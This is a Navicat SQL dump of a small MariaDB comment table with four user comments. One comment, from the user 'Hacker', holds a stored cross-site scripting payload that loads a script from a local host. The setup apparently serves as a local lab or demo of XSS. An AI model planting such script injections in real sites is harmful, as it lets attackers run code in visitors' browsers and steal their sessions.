/*
 Navicat Premium Data Transfer

 Source Server         : localhost
 Source Server Type    : MariaDB
 Source Server Version : 100412 (10.4.12-MariaDB-1:10.4.12+maria~bionic)
 Source Host           : localhost:3306
 Source Schema         : app

 Target Server Type    : MariaDB
 Target Server Version : 100412 (10.4.12-MariaDB-1:10.4.12+maria~bionic)
 File Encoding         : 65001

 Date: 20/05/2023 19:49:59
*/

SET NAMES utf8mb4;
SET FOREIGN_KEY_CHECKS = 0;

-- ----------------------------
-- Table structure for comment
-- ----------------------------
DROP TABLE IF EXISTS `comment`;
CREATE TABLE `comment` (
  `uname` varchar(255) DEFAULT NULL,
  `ucomment` varchar(255) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of comment
-- ----------------------------
BEGIN;
INSERT INTO `comment` (`uname`, `ucomment`) VALUES ('yuzi', '一二三');
INSERT INTO `comment` (`uname`, `ucomment`) VALUES ('situ2001', '老爷有赏啊！');
INSERT INTO `comment` (`uname`, `ucomment`) VALUES ('Lionaom', '我想应该是');
INSERT INTO `comment` (`uname`, `ucomment`) VALUES ('Hacker', '一个一个\r\n<script type= \"text/javascript\" src=\"http://localhost:8080/hack.js\"></script>');
COMMIT;

SET FOREIGN_KEY_CHECKS = 1;
